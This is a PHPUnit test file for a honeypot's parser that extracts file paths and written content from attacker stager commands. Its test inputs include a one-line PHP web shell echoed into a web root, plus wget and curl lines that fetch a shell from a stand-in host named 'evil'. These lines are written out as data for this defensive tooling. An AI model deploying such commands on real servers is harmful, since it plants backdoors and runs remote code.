<?php

declare(strict_types=1);

namespace Funnypot\Tests\App\Storage;

use Funnypot\App\Storage\WriteRedirectExtractor;
use PHPUnit\Framework\TestCase;

/**
 * FP-0467 Phase 2a: the pure write-redirect parser. Extracts (path, literal content) from the stager
 * grammars a scanner uses to confirm semi-blind RCE, and the path-only case for command-output / remote
 * fetch redirects. No I/O, no reflection, bounded.
 */
final class WriteRedirectExtractorTest extends TestCase
{
    public function test_echo_literal_redirect_captures_path_and_content(): void
    {
        $r = WriteRedirectExtractor::extract('echo VULN123 > /var/www/html/out.txt');
        self::assertNotNull($r);
        self::assertSame('/var/www/html/out.txt', $r['path']);
        self::assertSame('VULN123', $r['content']);
        self::assertSame(WriteRedirectExtractor::KIND_LITERAL, $r['kind']);
    }

    public function test_quoted_php_payload_is_unwrapped(): void
    {
        $r = WriteRedirectExtractor::extract('echo "<?php system($_GET[0]);?>" > /var/www/html/s.php');
        self::assertNotNull($r);
        self::assertSame('/var/www/html/s.php', $r['path']);
        self::assertSame('<?php system($_GET[0]);?>', $r['content']);
        self::assertSame(WriteRedirectExtractor::KIND_LITERAL, $r['kind']);
    }

    public function test_quoted_path_with_space_is_captured_whole(): void
    {
        // The path group must accept a quoted path; it previously truncated at the first space.
        $r = WriteRedirectExtractor::extract('echo VULN > "/var/www/html/a b.php"');
        self::assertNotNull($r);
        self::assertSame('/var/www/html/a b.php', $r['path']);
        self::assertSame('VULN', $r['content']);
        self::assertSame(WriteRedirectExtractor::KIND_LITERAL, $r['kind']);
    }

    public function test_append_redirect_and_printf(): void
    {
        $r = WriteRedirectExtractor::extract('printf pwned >> ./verify.html');
        self::assertNotNull($r);
        self::assertSame('./verify.html', $r['path']);
        self::assertSame('pwned', $r['content']);
    }

    public function test_tee_pipe_captures_literal(): void
    {
        $r = WriteRedirectExtractor::extract('echo SENTINEL | tee /var/www/html/t.txt');
        self::assertNotNull($r);
        self::assertSame('/var/www/html/t.txt', $r['path']);
        self::assertSame('SENTINEL', $r['content']);
        self::assertSame(WriteRedirectExtractor::KIND_LITERAL, $r['kind']);
    }

    public function test_command_output_redirect_is_path_only(): void
    {
        $r = WriteRedirectExtractor::extract('id > /var/www/html/rce.txt');
        self::assertNotNull($r);
        self::assertSame('/var/www/html/rce.txt', $r['path']);
        self::assertNull($r['content'], 'command output is not statically known');
        self::assertSame(WriteRedirectExtractor::KIND_DYNAMIC, $r['kind']);
    }

    public function test_remote_fetch_is_path_only(): void
    {
        $r = WriteRedirectExtractor::extract('wget http://evil/shell.php -O /var/www/html/c.php');
        self::assertNotNull($r);
        self::assertSame('/var/www/html/c.php', $r['path']);
        self::assertNull($r['content']);
        self::assertSame(WriteRedirectExtractor::KIND_DYNAMIC, $r['kind']);

        $r2 = WriteRedirectExtractor::extract('curl http://evil/x -o /tmp/x.sh');
        self::assertNotNull($r2);
        self::assertSame('/tmp/x.sh', $r2['path']);
    }

    /** @dataProvider nonWrites */
    public function test_non_write_commands_return_null(string $command): void
    {
        self::assertNull(WriteRedirectExtractor::extract($command));
    }

    /** @return array<string,array{0:string}> */
    public function nonWrites(): array
    {
        return [
            'empty'           => [''],
            'bare-echo'       => ['echo hello world'],
            'comparison'      => ['test 2 > 1'],              // ">" but no path-shaped target
            'plain-id'        => ['id'],
            'ls'              => ['ls -la /tmp'],
            'redirect-to-num' => ['echo x > 2'],              // target "2" is not path-shaped
        ];
    }

    public function test_input_and_content_are_bounded(): void
    {
        // Content within the input cap but over the content cap: the write is parsed, content truncated.
        $big = 'echo ' . str_repeat('A', 5000) . ' > /var/www/html/big.txt';
        $r = WriteRedirectExtractor::extract($big);
        self::assertNotNull($r);
        self::assertSame('/var/www/html/big.txt', $r['path']);
        self::assertSame(4096, strlen((string) $r['content']), 'content is capped to MAX_CONTENT');

        // A redirect whose `>` sits beyond the input cap is ignored (bounded, fails closed).
        $beyond = 'echo ' . str_repeat('A', 9000) . ' > /var/www/html/x.txt';
        self::assertNull(WriteRedirectExtractor::extract($beyond));
    }
}
